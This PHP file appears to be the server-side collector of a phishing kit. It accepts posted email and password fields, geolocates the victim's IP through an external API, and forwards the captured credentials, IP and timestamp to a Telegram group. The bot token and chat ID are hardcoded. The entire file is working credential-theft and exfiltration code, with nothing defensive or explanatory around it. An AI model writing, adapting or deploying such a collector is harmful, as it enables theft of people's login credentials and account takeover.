<?php

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("HTTP/1.1 404 Not Found");
    exit;
}

// Capture and sanitize form data
$email = isset($_POST['ai']) ? trim($_POST['ai']) : '';
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';

// Validate that email and password are not empty
if (empty($email) || empty($password)) {
    exit; // Stop execution if required data is missing
}

// Get additional information
$adddate = date("D M d, Y g:i a");
$ip = $_SERVER['REMOTE_ADDR'];

// Get country using an external API
$country = "Unknown";
$ip_api_url = "http://ip-api.com/json/{$ip}";
$response = @file_get_contents($ip_api_url);
if ($response) {
    $json_data = json_decode($response, true);
    if ($json_data && isset($json_data['country'])) {
        $country = $json_data['country'];
    }
}

// Format the message
$message = "🛡️ *New Login Captured*\n";
$message .= "📧 *Email:* `$email`\n";
$message .= "🔑 *Password:* `$password`\n";
$message .= "🌎 *Country:* $country\n";
$message .= "📅 *Date & Time:* $adddate\n";
$message .= "🖥️ *IP Address:* `$ip`\n";
$message .= "⚡ Powered by Your Secure Portal";

// Telegram Bot Details
$telegram_bot_token = "6308656339:AAFDkqq4k7Op4eZRxa5OwANOdVfZmmmjmJ0";  // Replace with your bot token
$telegram_group_id = "-1002491638777";  // Replace with your Telegram group ID
$telegram_api_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";

// Prepare and send data to Telegram
$data = [
    'chat_id' => $telegram_group_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
        'timeout' => 5 // Set timeout to prevent script from hanging
    ]
];

$context = stream_context_create($options);
$result = @file_get_contents($telegram_api_url, false, $context);

// Debugging response (optional, remove in production)
// echo $result;

?>
